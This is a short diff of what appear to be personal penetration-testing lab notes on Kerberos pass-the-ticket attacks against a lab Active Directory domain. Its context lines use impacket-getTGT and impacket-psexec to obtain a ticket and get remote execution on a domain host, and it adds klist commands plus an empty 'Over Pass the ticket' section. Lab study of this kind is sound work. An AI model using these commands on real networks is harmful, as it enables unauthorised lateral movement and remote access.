@@ -21,7 +21,15 @@ impacket-getTGT -dc-ip 192.168.154.134 Marvel.local/hawkeye
 export KRB5CCNAME=hawkeye.ccache
 
 impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/hawkeye@THE-PUNISHER.MARVEL.local
+
+
+#use windows check ticket is available 
+klist
+klist /purge #delete
 ```
 
 
 #### Over Pass the ticket (PTH + PTT) :
+```bash
+
+```
